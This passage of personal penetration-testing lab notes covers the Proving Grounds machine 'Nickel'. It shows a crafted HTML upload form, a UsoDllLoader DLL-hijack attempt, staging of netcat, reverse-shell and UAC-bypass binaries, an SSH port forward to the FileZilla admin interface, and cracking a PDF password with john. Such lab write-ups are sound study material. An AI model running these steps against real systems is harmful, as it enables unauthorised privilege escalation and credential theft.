+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException
    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
 
PS C:\ftp>
```

### Web app file upload
```powershell
ariah@NICKEL C:\ftp>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\ftp

09/01/2020  11:38 AM    <DIR>          .
09/01/2020  11:38 AM    <DIR>          ..
09/01/2020  10:02 AM            46,235 Infrastructure.pdf
               1 File(s)         46,235 bytes
               2 Dir(s)   8,068,796,416 bytes free

ariah@NICKEL C:\ftp>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\ftp

02/20/2022  05:10 AM    <DIR>          .
02/20/2022  05:10 AM    <DIR>          ..
02/20/2022  05:10 AM            14,963 14814.c
09/01/2020  10:02 AM            46,235 Infrastructure.pdf
               2 File(s)         61,198 bytes
               2 Dir(s)   8,067,514,368 bytes free

ariah@NICKEL C:\ftp>icacls 14814.c
14814.c BUILTIN\Administrators:(I)(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Users:(I)(RX)
        NT AUTHORITY\Authenticated Users:(I)(M)

Successfully processed 1 files; Failed processing 0 files

ariah@NICKEL C:\ftp>del 14814.c

ariah@NICKEL C:\ftp>

```

![](Pasted%20image%2020220220211217.png)

```html
┌──(kali㉿kali)-[/tmp]
└─$ cat exploit.html 
<form action="http://192.168.140.99/upload" method="post" enctype="multipart/form-data">
  <input type="file" id="filedata" name="filedata">
  <input type="text" name="filepath">
  <input type="submit">
</form>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$
```

![](Pasted%20image%2020220220214428.png)

```powershell
ariah@NICKEL C:\ftp>type C:\windows\system32\ws8089.ps1
C:\ftp\adduser.exe

ariah@NICKEL C:\ftp>
```

## Test USO upload
https://github.com/itm4n/UsoDllLoader

`C:\windows\system32\WindowsCoreDeviceInfo.dll`

![](Pasted%20image%2020220220215923.png)

![](Pasted%20image%2020220220215956.png)

```powershell
ariah@NICKEL C:\ftp>UsoDllLoader.exe
[*] Using UpdateOrchestrator->StartScan()
    |__ Creating instance of 'UpdateSessionOrchestrator'... Done.
    |__ Creating a new Update Session... Done.
    |__ Calling 'StartScan'... Done.
[-] Unable to connect to server!
[*] Retrying with UpdateOrchestrator->StartInteractiveScan()
    |__ Creating instance of 'UpdateSessionOrchestrator'... Done.
    |__ Creating a new Update Session... Done.
    |__ Calling 'StartInteractiveScan'... Done.
[-] Unable to connect to server!
[*] Retrying with UpdateOrchestrator->StartDownload()
    |__ Creating instance of 'UpdateSessionOrchestrator'... Done.
    |__ Creating a new Update Session... Done.
    |__ Calling 'StartInteractiveScan'... Done.
[-] Unable to connect to server!
[-] Exploit failed.
ariah@NICKEL C:\ftp>usoclient StartInteractiveScan

ariah@NICKEL C:\ftp>
```

## Try to restart system/shutdown

```
ariah@NICKEL C:\ftp>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

ariah@NICKEL C:\ftp>shutdown /s
Access is denied.(5)

ariah@NICKEL C:\ftp>

```

## Get Filezilla Interface

```bash

```


![](Pasted%20image%2020220220224114.png)


Download files first

```powershell
ariah@NICKEL C:\ftp>copy "C:\Program Files (x86)\FileZilla Server\FileZilla Server Interface.exe" C:\ftp\
        1 file(s) copied.

ariah@NICKEL C:\ftp>copy "C:\Program Files (x86)\FileZilla Server\libeay32.dll" C:\ftp\
        1 file(s) copied.

ariah@NICKEL C:\ftp>copy "C:\Program Files (x86)\FileZilla Server\ssleay32.dll" C:\ftp\
        1 file(s) copied.

ariah@NICKEL C:\ftp>
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.140.99
Connected to 192.168.140.99.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (192.168.140.99:kali): ariah
331 Password required for ariah
Password:
230 Logged on
Remote system type is UNIX.
ftp> dir
200 Port command successful
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp          73802 Feb 20 05:12 adduser.exe
-r-xr-xr-x 1 ftp ftp         501248 Feb 20 06:07 bypassuac-x64.exe
-r-xr-xr-x 1 ftp ftp        2770088 Feb 08  2017 FileZilla Server Interface.exe
-r--r--r-- 1 ftp ftp          46235 Sep 01  2020 Infrastructure.pdf
-r-xr-xr-x 1 ftp ftp          38616 Feb 20 06:31 nc.exe
-r-xr-xr-x 1 ftp ftp         339096 Feb 20 06:17 PsExec.exe
-r-xr-xr-x 1 ftp ftp          73802 Feb 20 06:18 rev.exe
-r-xr-xr-x 1 ftp ftp         144384 Feb 20 05:59 UsoDllLoader.exe
-r-xr-xr-x 1 ftp ftp        1930752 Feb 20 05:47 wp.exe
226 Successfully transferred "/"
ftp> get FileZillla\ Server\ Interface.exe
local: FileZillla Server Interface.exe remote: FileZillla Server Interface.exe
200 Port command successful
550 File not found
ftp> get FileZilla Server Interface.exe
local: Server remote: FileZilla
200 Port command successful
550 File not found
ftp> get "FileZilla Server Interface.exe"
local: FileZilla Server Interface.exe remote: FileZilla Server Interface.exe
200 Port command successful
150 Opening data channel for file download from server of "/FileZilla Server Interface.exe"
WARNING! 5127 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Successfully transferred "/FileZilla Server Interface.exe"
2770088 bytes received in 9.66 secs (280.1064 kB/s)
ftp> binary
200 Type set to I
ftp> get "FileZilla Server Interface.exe"
local: FileZilla Server Interface.exe remote: FileZilla Server Interface.exe
200 Port command successful
150 Opening data channel for file download from server of "/FileZilla Server Interface.exe"
226 Successfully transferred "/FileZilla Server Interface.exe"
2770088 bytes received in 5.78 secs (467.7793 kB/s)
ftp> exit
221 Goodbye
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ wine FileZilla\ Server\ Interface.exe 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.140.99                   
Connected to 192.168.140.99.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (192.168.140.99:kali): ariah
331 Password required for ariah
Password:
230 Logged on
Remote system type is UNIX.
ftp> dir
200 Port command successful
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp          73802 Feb 20 05:12 adduser.exe
-r-xr-xr-x 1 ftp ftp         501248 Feb 20 06:07 bypassuac-x64.exe
-r-xr-xr-x 1 ftp ftp        2770088 Feb 08  2017 FileZilla Server Interface.exe
-r--r--r-- 1 ftp ftp          46235 Sep 01  2020 Infrastructure.pdf
-r--r--r-- 1 ftp ftp        1412608 Feb 06  2017 libeay32.dll
-r-xr-xr-x 1 ftp ftp          38616 Feb 20 06:31 nc.exe
-r-xr-xr-x 1 ftp ftp         339096 Feb 20 06:17 PsExec.exe
-r-xr-xr-x 1 ftp ftp          73802 Feb 20 06:18 rev.exe
-r--r--r-- 1 ftp ftp         365056 Feb 06  2017 ssleay32.dll
-r-xr-xr-x 1 ftp ftp         144384 Feb 20 05:59 UsoDllLoader.exe
-r-xr-xr-x 1 ftp ftp        1930752 Feb 20 05:47 wp.exe
226 Successfully transferred "/"
ftp> get libeay32.dll
local: libeay32.dll remote: libeay32.dll
200 Port command successful
150 Opening data channel for file download from server of "/libeay32.dll"
^C
receive aborted
waiting for remote to finish abort
426 Connection closed; transfer aborted.
226 ABOR command successful
884560 bytes received in 1.97 secs (438.4794 kB/s)
ftp> binary
200 Type set to I
ftp> get libeay32.dll
local: libeay32.dll remote: libeay32.dll
200 Port command successful
150 Opening data channel for file download from server of "/libeay32.dll"
226 Successfully transferred "/libeay32.dll"
1412608 bytes received in 2.72 secs (506.4121 kB/s)
ftp> get ssleay32.dll
local: ssleay32.dll remote: ssleay32.dll
200 Port command successful
150 Opening data channel for file download from server of "/ssleay32.dll"
226 Successfully transferred "/ssleay32.dll"
365056 bytes received in 0.91 secs (393.2903 kB/s)
ftp> exit
221 Goodbye
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ wine FileZilla\ Server\ Interface.exe &
...

┌──(kali㉿kali)-[~]
└─$ ssh ariah@192.168.140.99 -L 14147:127.0.0.1:14147     
ariah@192.168.140.99's password: 

```

![](Pasted%20image%2020220220230025.png)

## Crack PDF (Hint)

```bash
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nickel]
└─$ ftp 192.168.140.99                                                                                                                                              1 ⚙
Connected to 192.168.140.99.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (192.168.140.99:kali): ariah
331 Password required for ariah
Password:
230 Logged on
Remote system type is UNIX.
ftp> binary
200 Type set to I
ftp> get Infrastructure.pdf
local: Infrastructure.pdf remote: Infrastructure.pdf
200 Port command successful
150 Opening data channel for file download from server of "/Infrastructure.pdf"
226 Successfully transferred "/Infrastructure.pdf"
46235 bytes received in 0.36 secs (127.0388 kB/s)
ftp> exit
221 Goodbye
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nickel]
└─$ /usr/share/john/pdf2john.pl Infrastructure.pdf                                                                                                                  1 ⚙
Infrastructure.pdf:$pdf$4*4*128*-1060*1*16*14350d814f7c974db9234e3e719e360b*32*6aa1a24681b93038947f76796470dbb100000000000000000000000000000000*32*d9363dc61ac080ac4b9dad4f036888567a2d468a6703faf6216af1eb307921b0
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nickel]
└─$ /usr/share/john/pdf2john.pl Infrastructure.pdf > hash                                                                                                           1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nickel]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                           1 ⚙
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 4 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:10:16 52.93% (ETA: 10:11:45) 0g/s 12439p/s 12439c/s 12439C/s hayden1234567891011..haydeliz
ariah4168        (Infrastructure.pdf)
1g 0:00:13:23 DONE (2022-02-20 10:05) 0.001245g/s 12455p/s 12455c/s 12455C/s ariah4168..ariadne01
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nickel]
└─$         
```

![](Pasted%20image%2020220220231050.png)
## Script execution - Pivoting

![](Pasted%20image%2020220220235330.png)

![](Pasted%20image%2020220220235821.png)

![](Pasted%20image%2020220221000001.png)

![](Pasted%20image%2020220221000132.png)

# Others
